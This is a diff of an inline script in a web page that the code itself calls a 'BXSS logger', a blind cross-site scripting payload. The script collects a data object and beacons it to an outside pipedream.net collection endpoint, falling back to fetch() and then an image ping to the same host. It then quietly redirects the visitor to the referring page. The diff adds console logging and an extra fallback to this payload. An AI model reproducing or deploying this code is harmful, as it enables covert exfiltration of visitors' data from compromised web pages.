@@ -12,8 +12,10 @@ const data = {
   id: Math.random().toString(36).substring(2)
 };
 
+console.log("🛰️ BXSS logger executing…");
+
 function redirect() {
-  location.href = document.referrer || document.location.href;
+  location.href = document.referrer || location.href;
 }
 
 try {
@@ -21,13 +23,21 @@ try {
     "https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net",
     new Blob([JSON.stringify(data)], { type: "application/json" })
   );
-  setTimeout(redirect, 100);
+  console.log("✅ sendBeacon triggered");
+  setTimeout(redirect, 200);
 } catch (e) {
+  console.warn("⚠️ sendBeacon failed, using fetch()", e);
   fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
     method: "POST",
-    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ ...data, error: e.toString() })
-  }).finally(() => setTimeout(redirect, 300));
+  }).finally(() => {
+    console.log("✅ fetch fallback done");
+    setTimeout(redirect, 300);
+  });
+
+  // Fallback 3: always fire image ping
+  new Image().src = "https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net/img-fallback";
 }
 </script>
 </body>
